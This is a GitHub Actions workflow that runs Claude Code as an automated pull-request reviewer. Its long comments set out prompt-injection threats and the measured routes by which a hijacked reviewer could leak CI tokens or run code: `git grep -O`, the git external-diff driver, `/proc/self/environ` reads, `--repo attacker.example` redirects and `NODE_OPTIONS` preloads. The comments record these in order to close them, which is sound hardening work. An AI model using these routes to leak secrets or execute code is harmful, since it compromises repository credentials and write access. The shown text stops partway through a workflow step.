name: claude-code-review

# Automated PR review by Claude Code, posting inline comments on the specific
# lines where it finds issues. Runs on-demand, not on every push: a full review
# fires when a PR is opened or marked ready-for-review, and re-reviews fire when
# the author applies the `re-review` label (auto-cleared after, so it is a reusable
# "re-request review" button). Pushes do NOT auto-review, so a round of feedback
# commits does not trigger a fresh review each time. Controls (labels): `skip-review`
# (no review at all), `review:light` / `review:deep` (intensity). See the
# `creating-pull-requests` skill for the author-facing flow. This is the "auto"
# half of the Claude review setup; claude.yml is the interactive "@claude" half.
#
# Auth: uses CLAUDE_CODE_OAUTH_TOKEN (a long-lived token from `claude setup-token`)
# so reviews draw on the maintainer's Claude subscription rather than per-token API
# billing. Anthropic's own action counts as "ordinary individual use of Claude
# Code", which is the sanctioned use of a subscription token; see the PR that
# introduced this file for the full Terms-of-Service rationale.
#
# Public-repo safety: this runs only on same-repo (non-fork) PRs, enforced in two
# places — the job `if` below for `pull_request` events, and the "Resolve target PR"
# step for `workflow_dispatch`, which the `if` cannot gate because a hand-typed PR
# number is not in the event payload. GitHub does not expose repository secrets to
# workflows triggered by fork PRs, so the token would be empty there anyway; the
# `if` skips them cleanly instead of failing, and dispatch refuses them with a
# message. To review a contributor's fork PR, @claude it (handled by claude.yml) or
# run `/code-review <pr>` locally.
#
# PROMPT-INJECTION CONTAINMENT (DOR-464). The reviewer reads PR-authored text on
# every run — the diff, commit messages, existing comments — so treat everything
# it does as attacker-influenced.
#
# THE CONTAINMENT INVARIANT, which is the property to preserve and the thing to
# check any change against: NO tool the reviewer is granted can execute a shell,
# read the process environment, or reach the network of its own accord. Every
# grant is either a file tool held inside the workspace (`Read`, `Grep`, `Glob`) or
# goes through scripts/review-gh.sh, whose destination — host, repo, PR number,
# commit — is fixed by this file and cannot be influenced by an argument.
#
# Two of those three clauses are structural. The environment clause is NOT, and
# saying so matters: `Read` is not confined to the workspace by anything in Claude
# Code — measured on 2.1.219, a bare `Read` grant reads /etc/hosts — and
# `--setting-sources user` drops this repo's own `Read(...)` deny rules. It is the
# `--disallowedTools` line in claude_args that makes that clause true, so treat
# that line as part of the invariant rather than as a nicety, and read the note
# beside it about the double slash before touching it.
#
# The harness (scripts/test-review-classifier.sh) enforces the broader property
# that NO CHANGE TO THE REVIEWER'S POWERS GOES UNNOTICED: it pins the whole
# claude_args block — every flag, in order, and the exact contents of both tool
# lists — plus the fact that the helper is materialized under `${{ runner.temp }}`
# rather than anywhere a PR can write. A flag like
# `--dangerously-skip-permissions` or `--permission-mode bypassPermissions` voids
# the allow-list without changing its contents, so the fence watches the flags too.
#
# Why a helper rather than a tighter pattern: the Bash matcher is a PREFIX match.
# It cannot forbid a trailing `--repo attacker.example/a/b`, `--hostname
# attacker.example`, `-H "Authorization: Bearer $GH_TOKEN"` or
# `--jq 'env.CLAUDE_CODE_OAUTH_TOKEN'` — only an exact match would, and it permits
# extra flags plus `$VAR` expansion. Measured, all four.
#
# What violated the invariant before, all of it now gone:
#   * `Bash(grep:*)` / `Bash(rg:*)` — `grep "" /proc/self/environ` reads the
#     environment. Redundant with `Grep`/`Glob`/`Read`, which are workspace-bound.
#   * `Bash(gh pr comment:*)` and the dispatch-only `Bash(gh api ...)` — a sink the
#     model can re-aim with one trailing flag. `gh pr diff --repo HOST/OWNER/REPO`
#     reaches ANY host, and `gh pr view --jq env.X` reads the environment without
#     grep, so the read and the egress both survived removing only `grep`.
#   * `Bash(git log:*)` / `Bash(git show:*)` — ARBITRARY COMMAND EXECUTION, not
#     merely the "arbitrary local write" an earlier version of this comment
#     claimed. `--output=<file>` writes any path with any content; git executes a
#     `diff.external` / `GIT_EXTERNAL_DIFF` driver through `sh -c`; so writing
#     `$HOME/.gitconfig` and then running `git show --ext-diff HEAD` runs the
#     attacker's code with the job's full environment. Reproduced on git 2.53 in
#     three commands, none containing a metacharacter the matcher sees (the payload
#     sits inside single-quoted `--format` values), capturing both
#     CLAUDE_CODE_OAUTH_TOKEN and GH_TOKEN.
#   * `Bash(git grep:*)` — the same class in ONE command and with no config write
#     at all, which makes it the worst of the three: `-O<cmd>` /
#     `--open-files-in-pager=<cmd>` runs <cmd> through a shell. Reproduced on git
#     2.53 with stdin closed (`git grep -O'echo x > /tmp/f' pat </dev/null`) — the
#     redirection is what proves a shell rather than a bare exec; without
#     `</dev/null` git tries to behave interactively and the effect is easy to miss.
#     That this command refuses paths outside the repository, which is what an
#     earlier version of this comment vouched for, was never the whole question:
#     it was assessed as a file-READ primitive and `-O` was never considered.
# Any one of those leaks CLAUDE_CODE_OAUTH_TOKEN and the OIDC App token, which
# carries contents, pull_requests and issues WRITE.
#
# RESIDUAL RISK, accepted deliberately: the reviewer can still write anything it
# likes into a comment BODY, and `$VAR` expansion means it can put a secret there
# without reading one first. Pinning the destination does not change that; it
# changes where the secret lands. A comment on this repo's own PR is loud and
# auditable — visible to every watcher, it notifies, and it stays in the comment
# history. Anyone rotating a token leaked that way should assume it was read.
#
# Note the shape of that claim. It is a consequence of the invariant, not an
# independent guarantee: while no grant can execute a shell, the only place the
# reviewer can put anything is this repo's own PR. Break the invariant and the
# consequence goes with it — which is exactly what happened before this change,
# when a comment here asserted that silent egress was gone while two grants in the
# list were arbitrary code execution.
#
# WHAT THE HARNESS DOES NOT FENCE, recorded here rather than left to be discovered:
# the review step's `env:` map. The fence covers every flag the CLI is started
# with, but not the environment it is started in, and the environment is another
# way to change what the reviewer can do — `NODE_OPTIONS: --require
# ${{ github.workspace }}/scripts/pwn.js` would load PR-authored code into the CLI
# process and passes the suite untouched. That is the same shape as the HELPER_DIR
# repoint the fence now catches: a value pointing back into the PR-authored
# checkout. Fencing every env var is impractical and deliberately not attempted, so
# treat any edit to that map as security-relevant and review it as such — in
# particular, no value there should ever resolve inside `${{ github.workspace }}`.
#
# KNOWN BLIND SPOT — a PR with merge conflicts gets NO review, and no red check
# either (DOR-457). GitHub builds the test-merge ref (`refs/pull/N/merge`) before
# it creates a `pull_request` workflow run; when the PR conflicts with its base
# that ref cannot be built, so GitHub creates **no run at all** — not a failed
# one, not a skipped one, nothing in the Actions run list. This hits every
# `pull_request` workflow in the repo at once (changelog-fragment-check went quiet
# on the same events), so it is not something this file's triggers, `if`, or
# `concurrency` can fix. It is why PR #446 looked reviewed-and-clean having never
# been reviewed: `opened`, two `labeled`, and `ready_for_review` all landed while
# it conflicted, and only its two rebase force-pushes produced runs. Rebase to
# restore CI — or, to review without rebasing, use the `workflow_dispatch` below.
#
# KNOWN LIMITATION — a PR that edits this workflow cannot review itself. The
# action refuses to start when the running workflow differs from the default
# branch, and the verdict gate now makes that missing review RED. The
# `workflow_dispatch` comment below has the mechanism for testing the workflow
# after it lands. The action's guard is scoped to the running workflow file, so a
# PR editing claude.yml silences @claude on that PR and leaves this review
# working, and vice versa.
#
# What is deliberately made loud rather than silent: an infra failure that cost
# you a review posts a comment naming its actual cause (see "Verify the review
# result and posted verdict"), and `workflow_dispatch` exists so a review can be
# forced by hand on a PR GitHub will not dispatch events for.
#
# WHO ASKS AGAIN WHEN A REVIEW IS LOST. Nobody, until 2026-09-20: a red review
# sat red until a person noticed and applied `re-review`, which is why
# `review-completes` reads 88.5% against a 90% floor and nothing ever moved.
# merge-tail now re-requests one on a schedule, by applying `re-review` — the
# same reusable button a person uses — backing off 10, 20 then 40 minutes and
# stopping after three tries per head SHA. The decision is
# scripts/should-redispatch-review.sh, fixture-pinned like every other decision
# merge-tail makes. Two consequences for this file: the run it produces is a
# `labeled` event whose ACTOR is the merge-tail app, which is why that app is in
# `allowed_bots` below; and the backoff is a MINIMUM wait, never a promise,
# because GitHub throttles cron hard (measured p50 2.7 h between merge-tail
# ticks, p90 5 h).
#
# EVERY RUN SAYS WHAT KIND OF OUTCOME IT WAS, in one word, in the job summary
# and as a `review-outcome-class` notice annotation: a real review, a spent
# subscription window (session or weekly), a missing credential, a fork, an
# exhausted turn budget, or an infrastructure failure. See "Report the outcome
# class". It is a record, not a decision — it can never turn a red run green.
#
# WHAT GREEN MEANS (DOR-1665, DOR-1877), scoped exactly, because the scope is the
# honest part. Green requires BOTH facts:
#   1. the review's own result message says it finished cleanly; and
#   2. a verdict-shaped bot comment from this run is verifiably on the PR.
# Nothing less is green, including an action exit of zero with no verdict. The
# action can report success after tool calls were refused and the model posted
# nothing (PRs #1680 and #1681), so its exit status is an input to the gate, never
# proof by itself. Conversely, the action can fail after the review finished and
# posted its verdict: it re-checks `num_turns` against `--max-turns` after a run
# ends and throws when a clean run overshot, which happened on PR #1409, run
# 33524055964. A turn cap exists to stop a runaway loop, never to fail a review
# that finished.
#
# The last three steps of this job implement that rule: "Claude Code review" is
# `continue-on-error`, the step after it verifies the result and posted verdict
# for every non-skipped outcome, and "Decide the check" always turns those facts
# into the check's colour with red as its default. Read them together, and read
# the block comment on each before changing any of them.
#
# The dispatch path is NOT the automatic path with a different trigger. The action
# treats workflow_dispatch as an *automation* context with no PR identity, which
# switches off two things it does for us on `pull_request`, so this file supplies
# both: the PR head's agent config is reverted by a step here ("Revert PR-authored
# agent config"), and line-level findings are posted through the review helper's
# `inline` subcommand because the inline-comment tool is not registered (see
# "Claude Code review"). Keep that in mind before assuming a dispatch run behaves
# identically.

on:
  # On-demand, not on every push: no `synchronize`. A full review fires on open
  # and on ready-for-review; re-reviews fire when the `re-review` label is added.
  pull_request:
    types: [opened, ready_for_review, reopened, labeled]

  # Manual review of any open PR by number. Two jobs (DOR-457):
  #   1. Escape hatch for the conflicted-PR blind spot above — the only way to get
  #      a review onto a PR GitHub refuses to dispatch events for.
  #   2. Debugging affordance for this file. A PR that edits this workflow gets a
  #      RED `claude-code-review` check and no review: the steps below do run
  #      (a `pull_request` run uses the PR merge commit's copy of the workflow,
  #      not the default branch's), but `anthropics/claude-code-action` refuses to
  #      start when the workflow file's content differs from the copy on the
  #      default branch — an anti-exfiltration guard, since a PR could otherwise
  #      rewrite this file to leak the OAuth token — and the action itself exits
  #      successfully:
  #      "Skipping action due to workflow validation ... must ... have identical
  #      content to the version on the repository's default branch". A trusted
  #      default-branch dispatch can still review that PR's head and post a verdict
  #      (measured on run 34175828534). That dispatch executes the workflow and final
  #      gate from the default branch. The automatic run still proves a proposed
  #      gate fails closed when validation blocks the review; after merging, dispatch
  #      against a known PR number again to prove the successful-review path under
  #      the merged gate.
  # Dispatch already requires write access, so it needs no author gate; it is an
  # explicit human action and therefore ignores `skip-review` and draft state. It
  # still refuses fork PRs (see "Resolve target PR").
  workflow_dispatch:
    inputs:
      pr:
        description: 'Number of the pull request to review (same-repo PRs only)'
        required: true
        type: string

# Opt into Node 24 for JavaScript-based actions ahead of GitHub's Sept 2026 cutoff
# for the Node 20 runtime (matches docs-openapi-check.yml).
env:
  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: 'true'
  # The repo's own default branch: the one ref in this job that a PR cannot write
  # to, so the trust anchor for everything below that must not come from the PR's
  # checkout — the agent-config revert AND the failure classifier. Defined at
  # workflow level, not per step, because BOTH triggers need it: the
  # `github.event.repository` object is present on `pull_request` and
  # `workflow_dispatch` alike, and scoping it to the dispatch-only revert step is
  # how the classifier ended up running the PR's own copy on both paths (review
  # round 3, finding 1).
  DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
  # Turn budget for the review step (DOR-396, re-sized 2026-09-20 from measured
  # data). Large PRs need more read/grep/verify turns than small ones, or the
  # action dies mid-review and leaves a red check that looks identical to one
  # backed by real findings. Tune these here rather than inside claude_args.
  #
  # THE NUMBERS, AND WHERE THEY COME FROM
  # (research/20260919_ci-pipeline-supporting/07-claude-review-effectiveness.md
  # §6, 60 random successful runs plus 52 read failure logs over 30 days):
  #   * turns used by a successful review: median 32.5, p90 49, max 74;
  #   * the old default cap was 50, and 13 of those 60 runs used 45 or more —
  #     so the distribution was CENSORED at the cap and its true p90 is at or
  #     above 49, not equal to it;
  #   * 24 of 52 failures were `error_max_turns` at turn 51, on a median of 20
  #     changed files — i.e. the runs dying were mostly SMALL PRs on the 50
  #     budget, not big ones on the 100 budget. In the last 7 days that was 11
  #     of 123 started reviews (9%), up from 3% over 30 days.
  # So the floor is set at 80: above the maximum turn count observed anywhere
  # in that sample (74), which means every run in it would have finished. It is
  # 2.5x the median, so a normal review is nowhere near it.
  #
  # The budget then scales with the diff, continuously rather than in one step
  # at 30 files: BASE + PER_FILE x changed files, clamped to [MIN, MAX]. A
  # 10-file PR gets 80, a 30-file PR 120, anything larger 120 (up from the old
  # 100, whose own sample topped out at 74).
  #
  # The ceiling is what `timeout-minutes` below has to cover, which is why it is
  # not simply large: successful runs take 3.7 min median and 6.8 min p90 for
  # ~32-49 turns, so roughly 7-10 s a turn, and 120 turns is 14-20 min inside a
  # 25-minute job. Raising MAX without raising that timeout just trades the turn
  # cap for a wall-clock cap, which is a worse failure (no result message to
  # classify). The cap's job is to bound a runaway loop; it was never meant to
  # end a review that is still working.
  REVIEW_MAX_TURNS_BASE: '60'
  REVIEW_MAX_TURNS_PER_FILE: '2'
  REVIEW_MAX_TURNS_MIN: '80'
  REVIEW_MAX_TURNS_MAX: '120'

# ONE REVIEW PER HEAD SHA, AND A RUN THAT WILL NOT REVIEW CANNOT EVICT ONE THAT
# WILL. Two things changed here on 2026-09-20; read both before touching it.
#
# WHAT WENT WRONG. The old key was the PR NUMBER and the old
# `cancel-in-progress` expression was false for a non-`re-review` `labeled`
# event, on the theory that a run which will skip cannot cancel anything. That
# theory is wrong, and measuring it cost about 3% of all merged PRs their review
# (research/20260919_ci-pipeline-supporting/07-claude-review-effectiveness.md §1:
# 23 PRs in 30 days, #1251 through #1868, verified on #1865 — the cancelled runs
# have zero jobs, so they were cancelled while still PENDING). A concurrency
# group holds at most one RUNNING and one PENDING run: when a third run enters,
# GitHub cancels the pending one **whatever the entrant's `cancel-in-progress`
# says**, because that flag governs cancelling the RUNNING member, not the queue.
# `gh pr create --label review:light --label skip-changelog` fires `opened` plus
# two `labeled` events within the same second; the `opened` run is still pending;
# the labeled runs evict it and then skip at the job gate. The comment this
# replaces claimed PRs #142/#161 fixed that — they fixed the in-progress half
# only, and the file then vouched for a fix it did not have.
#
# THE FIX, in two parts:
#   1. A run that will not review gets its OWN group, named for the label that
#      triggered it, so it can never be in the same queue as a real review.
#      Anything that WILL review — `opened`, `ready_for_review`, `reopened`, a
#      `re-review` label, a dispatch — lands in the `-review` group. The
#      condition here is deliberately the same shape as the job `if:` below;
#      they must agree, and if they ever disagree the safe direction is this one
#      being too broad (a run that skips sits alone in the review group and
#      cancels a PENDING sibling that would have reviewed — exactly the old bug),
#      so keep them in step.
#   2. The key is the HEAD SHA, not the PR number, because the head SHA is what
#      a review is ABOUT and what `review-completes` is keyed by (ci/slos.yaml).
#      Two triggers on one SHA still dedupe — `cancel-in-progress: true` means
#      the newer one cancels the older, and the newer one reviews, so no verdict
#      is lost and the PR is not reviewed twice for the same code.
#
# WHAT THIS DELIBERATELY CHANGES. Under the old per-PR key, a review of an older
# SHA was cancelled when a newer trigger arrived. Under a per-SHA key it runs to
# completion and posts its verdict, correctly attributed to the SHA it read. That
# costs a little subscription budget in the rare case where two review triggers
# straddle a push (reviews do not fire on `synchronize`, so this needs a push
# BETWEEN two review triggers), and it buys a review that is never half-done.
#
# `workflow_dispatch` carries no head SHA in its payload, so a manual run is
# keyed by PR number instead and therefore no longer shares a group with the
# automatic run for that PR's head: a dispatch now runs BESIDE an in-flight
# automatic review rather than replacing it. That is the right trade for the
# escape hatch — it exists for PRs GitHub will not dispatch events for, where
# there is nothing to replace.
#
# A cancellation always leaves a `cancelled` run in the list, so this block can
# never be the reason a PR shows no run at all — that is the conflicted-PR blind
# spot in the header.
concurrency:
  group: >-
    claude-review-${{ github.event.pull_request.head.sha || format('pr{0}', github.event.inputs.pr) }}-${{
    (github.event.action == 'labeled' && github.event.label.name != 're-review')
    && format('noop-{0}', github.event.label.name) || 'review' }}
  cancel-in-progress: true

permissions:
  contents: read
  pull-requests: write
  issues: read
  id-token: write

jobs:
  review:
    # Same-repo PRs only (fork PRs have no secret access — see header), not while
    # still a draft, and not when the author opted out with `skip-review`. On a
    # `labeled` event, only the `re-review` label triggers a pass (adding a
    # `review:*` or `skip-review` label must not itself fire a review).
    # A workflow_dispatch run bypasses these gates on purpose — it is a maintainer
    # asking for a review by hand — but "Resolve target PR" still enforces the
    # same-repo rule, which is the one that is about safety rather than politeness.
    if: >-
      github.event_name == 'workflow_dispatch' ||
      (
        github.event.pull_request.head.repo.full_name == github.repository &&
        github.event.pull_request.draft == false &&
        !contains(github.event.pull_request.labels.*.name, 'skip-review') &&
        (github.event.action != 'labeled' || github.event.label.name == 're-review')
      )
    runs-on: ubuntu-latest
    # Guards against a runaway review if --max-turns is not honored (the action
    # has no internal timeout). Sized for the ceiling of the turn budget above
    # (REVIEW_MAX_TURNS_MAX): at the measured 7-10 s a turn, 120 turns is 14-20
    # minutes, which fits here with room for checkout and setup. Raising
    # REVIEW_MAX_TURNS_MAX without raising this would just trade the turn cap for
    # a wall-clock cap, and a wall-clock kill is strictly worse — it leaves no
    # result message for the classifier to read, so the failure comes out as
    # `infra` with no cause named.
    timeout-minutes: 25
    steps:
      # Single answer to "which PR is this reviewing?", so every step below works
      # under either trigger. Runs before checkout because `gh` needs no worktree.
      # The dispatch input is hand-typed, so it is validated here: a non-numeric
      # value would otherwise flow into `gh pr view` and the prompt as nonsense.
      # Fork PRs are refused rather than reviewed: the job `if` cannot see a PR
      # number typed into a dispatch form, so the same-repo rule from the header is
      # re-asserted here. That rule is the trust boundary the rest of this job
      # assumes — see "Revert PR-authored agent config", which is what actually
      # hardens the head's config, and note that same-repo is a floor, not a
      # substitute for it.
      - name: Resolve target PR
        id: target
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          EVENT_NAME: ${{ github.event_name }}
          EVENT_PR: ${{ github.event.pull_request.number }}
          DISPATCH_PR: ${{ github.event.inputs.pr }}
          REPO: ${{ github.repository }}
        run: |
          if [ "$EVENT_NAME" != 'workflow_dispatch' ]; then
            echo "number=$EVENT_PR" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          case "$DISPATCH_PR" in
            '' | *[!0-9]*)
              echo "::error::'pr' must be a pull request number; got '$DISPATCH_PR'"
              exit 1
              ;;
          esac

          head_repo=$(gh pr view "$DISPATCH_PR" --repo "$REPO" \
            --json headRepositoryOwner,headRepository \
            --jq '"\(.headRepositoryOwner.login)/\(.headRepository.name)"')
          if [ "$head_repo" != "$REPO" ]; then
            # Written BEFORE the exit, so "Report the outcome class" below can
            # tell a fork refusal apart from an infrastructure failure. An
            # output set by a step that then fails is still readable by later
            # steps; only outputs of a SKIPPED step are lost.
            echo "fork=yes" >> "$GITHUB_OUTPUT"
            echo "::error::PR #$DISPATCH_PR comes from a fork ($head_repo). Review fork PRs by mentioning @claude on them (claude.yml) or with /code-review locally."
            exit 1
          fi

          echo "number=$DISPATCH_PR" >> "$GITHUB_OUTPUT"

      # DEPENDABOT, HONESTLY (report 07 §6: 5 of 52 failures in 30 days, every
      # one of them a Dependabot PR). `allowed_bots` below lets the action start
      # for a bot author, but that is only half the story, and shipping the half
      # would have swapped one reliable failure for another.
      #
      # GitHub gives a workflow triggered by Dependabot through `pull_request` a
      # READ-ONLY `GITHUB_TOKEN` and NO access to repository secrets at all,
      # whatever `permissions:` this file declares — the same restriction
      # dependabot-lockfile-repair.yml documents at length, with GitHub's own
      # wording ("the only secrets available to the workflow are Dependabot
      # secrets"). So on such a run `secrets.CLAUDE_CODE_OAUTH_TOKEN` is the
      # EMPTY STRING, the action has nothing to authenticate with, and the review
      # fails at turn 1 having spent nothing — which is the exact shape the
      # classifier calls `no`, i.e. it would be announced as a usage limit or a
      # stale token and send whoever reads it to rotate a token that is fine.
      #
      # `pull_request_target` is the documented escape and is NOT an option here:
      # this job reads PR-authored text with a model, and the header's whole
      # containment argument assumes the untrusted-trigger form. The supported
      # routes are, in order: put CLAUDE_CODE_OAUTH_TOKEN in the repository's
      # DEPENDABOT secrets as well as its Actions secrets (an operator action —
      # nothing in this repo can set it), after which these runs simply work; or
      # let merge-tail re-request the review by label, which runs under the
      # merge-tail app rather than Dependabot and therefore holds normal secrets.
      #
      # Until one of those happens this step is what stands between a Dependabot
      # PR and a misleading red check. It fails the job — a review that cannot
      # run is not a review, and fail-closed is this file's rule everywhere —
      # but it names the real cause, and "Report the outcome class" records the
      # run as `no_credentials` rather than letting it be counted as a review
      # that failed. Note it cannot post a PR comment saying so: on a Dependabot
      # run the token is read-only, so the annotation and the job summary are the
      # only channels there are.
      - name: Check the reviewer has a credential
        id: credential
        env:
          # An expression over a secret, never the secret: this prints `true` or
          # `false` and cannot leak the value.
          HAVE_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN != '' }}
          ACTOR: ${{ github.actor }}
        run: |
          if [ "$HAVE_TOKEN" = 'true' ]; then
            echo "have=yes" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          echo "have=no" >> "$GITHUB_OUTPUT"
          if [ "$ACTOR" = 'dependabot[bot]' ]; then
            echo "::error::No CLAUDE_CODE_OAUTH_TOKEN on a Dependabot-triggered run. GitHub withholds repository secrets from these runs by design. Add CLAUDE_CODE_OAUTH_TOKEN to the repository's Dependabot secrets, or let merge-tail re-request the review with the re-review label. Nothing in this pull request was looked at."
          else
            echo "::error::CLAUDE_CODE_OAUTH_TOKEN is empty, so the reviewer has nothing to authenticate with. Nothing in this pull request was looked at; this is not a finding about the code."
          fi
          exit 1

      - name: Checkout
        uses: actions/checkout@v7
        with:
          fetch-depth: 0
          # Empty means "checkout's own default", which for a `pull_request` run is
          # the PR's test-merge ref — leave that path exactly as it was. A
          # workflow_dispatch run would otherwise check out the dispatched branch
          # (main) and review the PR against the wrong files, so point it at the
          # target PR's head instead.
          ref: ${{ github.event_name == 'workflow_dispatch' && format('refs/pull/{0}/head', steps.target.outputs.number) || '' }}

      # SECURITY (DOR-457). On `pull_request` the action neutralizes the PR head's
      # agent config for us. On `workflow_dispatch` it does not, so do it here.
      #
      # `anthropics/claude-code-action` calls restoreConfigFromBase() only when the
      # event produced a PR *entity* context (src/entrypoints/run.ts). A
      # workflow_dispatch run is an *automation* context with no `isPR` at all
      # (src/github/context.ts), so that restore never fires. It exists because the
      # CLI's non-interactive mode trusts the working directory: it reads
      # `.mcp.json`, `.claude/settings.json` and `.claude/settings.local.json` from
      # cwd and acts on them BEFORE any tool-permission gating — running hooks
      # (including SessionStart), setting env vars (NODE_OPTIONS, LD_PRELOAD, PATH),
      # shelling out for apiKeyHelper/awsAuthRefresh, and auto-approving project MCP
      # servers (the action sets enableAllProjectMcpServers itself).
      #
      # This repo supplies the trigger. Its own `.claude/settings.json` defines a
      # PreToolUse hook on `Bash` that runs `node .claude/hooks/file-guard.mjs`, and
      # both it and the hook scripts are tracked and PR-editable. The reviewer's
      # first act is reading the diff — a Bash call — so a PR-authored hook would
      # execute as a shell command inside a job holding CLAUDE_CODE_OAUTH_TOKEN and
      # an OIDC-minted App token with write scopes. Note this sits UPSTREAM of the
      # allow-list: a PreToolUse hook runs before tool gating, so routing the
      # reviewer's GitHub access through a fixed-shape helper does not cover it.
      #
      # The trust boundary, stated plainly: reaching this needs push access,
      # because only a same-repo PR gets past "Resolve target PR". This is not a
      # fork-PR RCE. But upstream deliberately closed it even for same-repo PRs,
      # and an escape hatch must not be softer than the path it substitutes for.
      #
      # Dispatch-only on purpose: running it on `pull_request` too would pre-empt
      # the action's own restore and make its `.claude-pr/` snapshot (kept so
      # review agents can inspect what a PR changes) capture the base version
      # instead of the PR's.
      #
      # The path list is the action's own SENSITIVE_PATHS
      # (src/github/operations/restore-config.ts): everything PR-controllable that
      # the CLI reads from cwd at startup. Restore from the repo's DEFAULT branch
      # rather than the PR's base, because a stacked PR's base is another PR's head
      # and so is not itself vouched for. Delete before checking out, because
      # `git checkout <ref> -- <path>` cannot remove a file the PR ADDED.
      - name: Revert PR-authored agent config
        if: github.event_name == 'workflow_dispatch'
        run: |
          # Fail closed: without a trusted branch to restore from there is nothing
          # to revert to, and reviewing anyway would run the PR's own hooks.
          if [ -z "$DEFAULT_BRANCH" ]; then
            echo "::error::Could not resolve the default branch; refusing to review with PR-authored agent config in place."
            exit 1
          fi

          paths=(.claude .mcp.json .claude.json .gitmodules .ripgreprc CLAUDE.md CLAUDE.local.md .husky)

          # Delete every PR-controlled path BEFORE any git operation that touches
          # the network, mirroring the order upstream uses (restore-config.ts): a
          # hostile `.gitmodules` is then simply absent while git is talking to a
          # remote, rather than being suppressed by a flag. `--no-recurse-submodules`
          # below stays as the second layer, which is how upstream treats it.
          present=
          for p in "${paths[@]}"; do
            [ -e "$p" ] && present="$present $p "
            rm -rf "$p"
          done
          was_present() { case "$present" in *" $1 "*) return 0 ;; *) return 1 ;; esac; }

          # `fetch-depth: 0` on the checkout above already fetched
          # `+refs/heads/*:refs/remotes/origin/*`, so the default branch is normally
          # here already — fetch only if it is missing. Never with `--depth=1`:
          # fetching a branch shallow makes the WHOLE checkout shallow, which cut
          # `git rev-list --count` from 1765 to 1 and truncated `git log <path>` to a
          # single entry. That measurement was originally about the review itself,
          # which no longer holds any `git` grant (DOR-464) and no longer depends on
          # history — REVIEW.md never asked for it. It stays because THIS step and
          # the materialize step below both read `origin/$DEFAULT_BRANCH` out of the
          # object database, and a full fetch is the cheap way to be sure the objects
          # they need are present.
          if ! git rev-parse --verify --quiet "refs/remotes/origin/$DEFAULT_BRANCH" >/dev/null; then
            if ! git fetch --no-recurse-submodules --no-tags origin \
              "+refs/heads/$DEFAULT_BRANCH:refs/remotes/origin/$DEFAULT_BRANCH"; then
              echo "::error::Could not fetch origin/$DEFAULT_BRANCH; refusing to review with PR-authored agent config in place."
              exit 1
            fi
          fi

          restored=
          deleted=
          for p in "${paths[@]}"; do
            if git checkout "origin/$DEFAULT_BRANCH" -- "$p" 2>/dev/null; then
              restored="$restored $p"
            elif was_present "$p"; then
              # Absent on the default branch: the PR added it. It stays deleted.
              deleted="$deleted $p"
            fi
          done

          # `git checkout <ref> -- <path>` stages what it restores; unstage so the
          # revert cannot leak into anything committed later.
          git reset -- "${paths[@]}" >/dev/null 2>&1 || true

          # Logged (not just done) so a dispatch run is auditable and the
          # post-merge validation in this PR's description can assert on it.
          echo "Reverted from origin/$DEFAULT_BRANCH:${restored:- (nothing present)}"
          if [ -n "$deleted" ]; then
            echo "Deleted (PR-added, absent on origin/$DEFAULT_BRANCH):$deleted"
          fi

      # SECURITY (DOR-464) — this is the step that makes the reviewer's only
      # GitHub access trustworthy. scripts/review-gh.sh carries the why; see also
      # PROMPT-INJECTION CONTAINMENT in the header.
      #
      # Materialized from the DEFAULT BRANCH, exactly like the failure classifier
      # below and for exactly the same reason: on BOTH triggers the checkout is
      # PR-authored (the merge ref on `pull_request`, `refs/pull/N/head` on
      # dispatch), `scripts/` is in neither the action's SENSITIVE_PATHS nor the
      # revert step's path list, and a helper the PR can rewrite is not a helper —
      # the attacker just rewrites it and keeps the destination it wanted. That
      # exact mistake was made once in this file's history (the classifier was run
      # from the checkout, review round 3, finding 1) and this is the shape that
      # fixed it: `git show <ref>:<path>` reads the object database, so nothing the
      # PR does to the worktree — including deleting the script — can reach it.
      #
      # Then made read-only, file and directory (0500). Be honest about what that
      # buys, because an earlier version of this comment oversold it: as long as the
      # CONTAINMENT INVARIANT holds, no granted tool can write a file at all, so
      # there is nothing for these permissions to stop. They mattered while
      # `Bash(git log:*)`/`Bash(git show:*)` were granted — `--output=<file>` wrote
      # any path — and even then they were the wrong layer, because those same
      # grants could execute a shell and simply `chmod u+w` a directory the runner
      # owns. So this is a cheap tripwire against a future write primitive, NOT a
      # containment control; the control is the allow-list. Kept because it costs
      # one line and closes the sibling-file route that a prefix match would accept
      # (`review-gh.sh.evil`) if the matcher's refusal to extend a matched path ever
      # regressed. Verified: `git log --output=` onto both the file and a `.evil`
      # sibling fails with "Permission denied". Nothing later in the job writes into
      # this directory, and ubuntu-latest runners are ephemeral, so it needs no
      # teardown.
      #
      # BOOTSTRAP, once per rename: a PR that adds or renames scripts/review-gh.sh
      # gets a RED check here and no review, because the trusted copy does not exist
      # until that PR lands. That is the fail-closed behaviour working, not a
      # regression — the alternative is running the PR's own copy — and the comment
      # it posts says so. A PR that only edits THIS FILE is unaffected: the helper is
      # already on the default branch, so this step succeeds and the run then ends in
      # the action's own workflow-validation guard (KNOWN LIMITATION above). The
      # always-running verdict gate makes that missing review red.
      - name: Materialize the trusted review helper
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR_NUMBER: ${{ steps.target.outputs.number }}
          REPO: ${{ github.repository }}
          HELPER_DIR: ${{ runner.temp }}/trusted
        run: |
          # Fail LOUD, not merely closed. Exiting here skips "Claude Code review",
          # so there is no result for the verdict probe to classify. Say the cause
          # on the PR first, then exit. This step and the always-running final gate
          # both stay red.
          refuse() {
            echo "::error::$1"
            gh pr comment "$PR_NUMBER" --repo "$REPO" --body \
              "This check is red because the review could not start: $1 Nothing in this PR was looked at, and this is not a finding about your code. Add the \`re-review\` label to try again." || true
            exit 1
          }

          if [ -z "$DEFAULT_BRANCH" ]; then
            refuse "the default branch could not be resolved, so the reviewer's GitHub helper would have had to come from this PR's own checkout."
          fi

          # `fetch-depth: 0` on the checkout above normally leaves the default
          # branch here already; fetch only if it is missing, and never shallow
          # (see the revert step for what shallowing costs the review).
          if ! git rev-parse --verify --quiet "refs/remotes/origin/$DEFAULT_BRANCH" >/dev/null; then
            git fetch --no-recurse-submodules --no-tags origin \
              "+refs/heads/$DEFAULT_BRANCH:refs/remotes/origin/$DEFAULT_BRANCH" || true
          fi

          # Two different problems, two different messages. "Not on the default
          # branch yet" is the bootstrap case: the PR that ADDS or RENAMES the
